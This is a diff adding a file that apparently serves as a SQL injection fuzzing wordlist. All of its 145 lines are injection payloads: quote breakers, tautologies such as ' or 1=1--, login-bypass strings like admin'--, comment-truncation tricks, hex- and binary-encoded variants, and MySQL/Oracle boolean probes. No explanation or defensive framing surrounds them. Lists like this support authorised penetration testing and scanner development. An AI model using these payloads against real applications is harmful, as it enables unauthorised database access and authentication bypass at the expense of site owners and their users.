@@ -1,0 +1,145 @@
+'-'
+' '
+'&'
+'^'
+'*'
+' or ''-'
+' or '' '
+' or ''&'
+' or ''^'
+' or ''*'
+"-"
+" "
+"&"
+"^"
+"*"
+" or ""-"
+" or "" "
+" or ""&"
+" or ""^"
+" or ""*"
+or true--
+" or true--
+' or true--
+") or true--
+') or true--
+' or '1'='1
+1'/**/or/**/1=1;--
+' or 1='1
+' or 1=1 -- -
+' or ' 1=1
+'--
+' #
+'/*
+' or 1=1#
+' or 1=1/*
+') or '1'='1--
+') or ('1'='1--
+' or username like '%
+' or uname like '%
+' or userid like '%
+' or uid like '%
+' or user like '%
+' or (EXISTS)
+1;SELECT *
+"
+#
+-
+--
+' --
+--';
+' ;
+= '
+= ;
+= --
+\x23
+\x27
+\x3D \x3B'
+\x3D \x27
+\x27\x4F\x52 SELECT *
+\x27\x6F\x72 SELECT *
+'or select *
+"' or 1 --'"
+" or 1=1 or ""="
+') or ('a'='a
+") or ("a"="a
+'hi' or 'x'='x';
+' or 1=1 or ''='
+' or ''='
+x' or 1=1 or 'x'='y
+/
+//
+//*
+*/*
+or 1-- -' or 1 or '1"or 1 or"
+'
+--ora_sqls
+#mysql
+'#mysql
+and 1=1
+and USER=USER
+and user()=user()
+and 2=0
+or 2=2
+' and '2'='2
+' and '2'='0
+' or '2'='2
+/*ora_mysql*/and/**/2=2
+/*ora_mysql*/and/**/2=0
+'/*ora_mysql*/and/**/'2'='2
+'/*ora_mysql*/and/**/'2'='0
+'/*ora_mysql*/or/**/'2'='2
+and 2=2#mysql
+and 2=0#mysql
+and 2=2-- oracle_mysql
+and 2=0-- oracle_mysql
+' and '2'='2'#mysql
+' and '2'='0'#mysql
+' and '2'='2'-- oracle
+' and '2'='0'-- oracle
+999999999999999999
+1e100
+2 or 2=2
+2' or '2'='2
+order by 1--
+admin'--
+admin'
+'test
+'test--
+' or 1=1--
+or 1=1--
+or 1=1
+or 1=1#
+" or 1=1#
+' admin'#
+' now()
+ or '1
+' || '1
+null' || 'a'=_binary'a
+' || 'a'=x'61
+' && '0'=x'30
+' %26%26 %270%27%3dx'30
+' && 0.e1=_binary"0
+ or 1.e1=0b1010
+' || 1 like 1
+'-'
+"-"
+' || 2 not like 1
+ or x'30'=48
+'1'!=20
+ or 20!='1'
+ and 2>0
+ || 0<1
+ || 0b1010<0b1011
+0b11 || 0b1010x'30'
+ or 0b1
+ /**/||1
+ ' or _binary'1
+ or 2121
+' or 12 rlike '1
+ or ''=''
+ || 0b1=x'31'
+ ||'1'!=20
+ || 1=1
+ || 1 like 1
+ || 12 rlike 1
